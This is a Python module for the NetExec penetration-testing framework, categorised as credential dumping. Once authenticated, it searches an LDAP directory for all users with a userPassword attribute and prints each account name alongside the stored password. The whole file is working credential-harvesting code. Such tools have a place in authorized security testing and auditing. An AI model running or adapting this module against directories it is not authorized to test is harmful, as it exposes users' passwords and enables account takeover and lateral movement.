from dataclasses import dataclass

from nxc.playbooks.results import ActionResult, ResultStatus
from nxc.helpers.misc import CATEGORY
from nxc.parsers.ldap_results import parse_result_attributes


class NXCModule:
    """
    Get userPassword attribute from all users in ldap
    Module by @SyzikSecu
    """

    name = "get-userPassword"
    description = "Get userPassword attribute from all users in ldap"
    supported_protocols = ["ldap"]
    category = CATEGORY.CREDENTIAL_DUMPING

    @dataclass
    class ResultData:
        users: list[dict]

    result_type = ResultData

    def options(self, context, module_options):
        """
        """

    def on_login(self, context, connection):
        response = connection.search(searchFilter="(userPassword=*)", attributes=["sAMAccountName", "userPassword"])
        users = parse_result_attributes(response)
        for user in users:
            context.log.highlight(f"User: {user.get('sAMAccountName')} userPassword: {user.get('userPassword')}")
        error = connection.last_search_error
        if not users and not error:
            context.log.display("No userPassword found")
        return ActionResult(
            "ldap", self.name, connection.host,
            ResultStatus.FAILED if error else ResultStatus.SUCCESS if users else ResultStatus.NEGATIVE,
            self.ResultData(users), error=error,
        )
